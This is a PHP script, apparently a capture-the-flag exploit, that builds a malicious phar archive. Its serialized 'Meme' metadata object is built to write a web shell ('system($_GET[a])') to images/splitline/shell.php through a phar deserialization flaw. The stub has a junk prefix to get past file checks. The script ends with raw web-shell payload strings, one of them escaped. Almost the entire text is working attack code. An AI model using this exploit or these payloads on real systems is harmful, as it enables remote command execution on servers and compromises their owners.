<?php
ini_set('phar.readonly', 0);
class Meme
{
    public $title;
    public $author;
    public $filename;
    private $content = NULL;
    function __construct($filename, $content = NULL)
    {
        $this->filename = $filename;
        $this->content = $content;
    }
}
$phar = new Phar("phar.phar");
$phar->startBuffering();
$phar->setStub("898787878787878787878787878787<?php __HALT_COMPILER(); ?>");
$meme = new Meme("images/splitline/shell.php", '<?php system($_GET[a]);');
$phar->setMetadata($meme);
$phar->addFromString("a.txt", "a");
$phar->stopBuffering();


'<?php system($_GET[a]);'
"'<'?php system(\$_GET[a]);#"